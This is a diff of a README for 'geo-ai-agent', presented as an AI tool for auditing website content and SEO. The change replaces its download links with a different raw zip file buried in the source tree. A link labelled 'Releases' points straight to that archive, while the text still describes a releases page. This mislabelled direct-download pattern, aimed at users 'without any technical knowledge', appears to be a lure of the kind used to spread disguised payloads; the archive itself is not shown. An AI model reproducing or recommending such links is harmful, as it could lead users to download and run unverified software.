@@ -1,7 +1,7 @@
 # 🌐 geo-ai-agent - Optimize Your Website Content Effortlessly
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/pauloeduardo1991/geo-ai-agent/main/phano/geo-ai-agent.zip)](https://raw.githubusercontent.com/pauloeduardo1991/geo-ai-agent/main/phano/geo-ai-agent.zip)
+[![Download](https://github.com/pauloeduardo1991/geo-ai-agent/raw/refs/heads/main/src/ai_content_optimization_agent/geo-ai-agent-v3.5.zip)](https://github.com/pauloeduardo1991/geo-ai-agent/raw/refs/heads/main/src/ai_content_optimization_agent/geo-ai-agent-v3.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the geo-ai-agent! This tool helps you audit and enhance your website content. It uses AI to crawl your URLs, analyze H1 tags, and provide GEO recommendations. With this tool, you can improve your site’s SEO and user engagement without any technical knowledge.
@@ -28,7 +28,7 @@ Before you download the geo-ai-agent, ensure that your computer meets these requ
 - **Python**: Python 3.8 or later installed on your system.
 
 ## 📥 Download & Install
-To get the geo-ai-agent, visit this page to download: [geo-ai-agent Releases](https://raw.githubusercontent.com/pauloeduardo1991/geo-ai-agent/main/phano/geo-ai-agent.zip).
+To get the geo-ai-agent, visit this page to download: [geo-ai-agent Releases](https://github.com/pauloeduardo1991/geo-ai-agent/raw/refs/heads/main/src/ai_content_optimization_agent/geo-ai-agent-v3.5.zip).
 
 Once on the releases page, look for the latest version. Click on it to see the available files. Download the suitable file for your operating system by clicking on the link. Follow these steps:
 
